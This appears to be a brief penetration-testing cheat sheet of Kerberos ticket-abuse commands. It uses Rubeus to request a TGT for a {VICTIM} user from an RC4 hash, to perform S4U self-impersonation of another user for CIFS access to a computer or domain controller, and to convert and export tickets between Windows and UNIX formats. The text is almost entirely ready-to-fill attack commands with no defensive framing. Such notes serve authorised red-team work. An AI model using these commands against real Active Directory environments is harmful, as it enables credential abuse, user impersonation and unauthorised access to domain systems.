TGT with Rubeus
```powershell
.\Rubeus.exe asktgt /nowrap /user:{VICTIM} /rc4:
```

TGS with Rubeus
```powershell
.\Rubeus.exe s4u /self /nowrap /impersonateuser:{SOMEUSER} /altservice:"cifs/COMPUTER|DC" /ticket:TGT
```

RubeusToCcache
```
python3 rubeustoccache.py 
```

Export KRB5CCNAME
```bash
export KRB5CCNAME=
```

Ticket Converter
```bash
ticket=
# Windows -> UNIX
ticketConverter.py $ticket.kirbi $ticket.ccache

# UNIX -> Windows
ticketConverter.py $ticket.ccache $ticket.kirbi
```
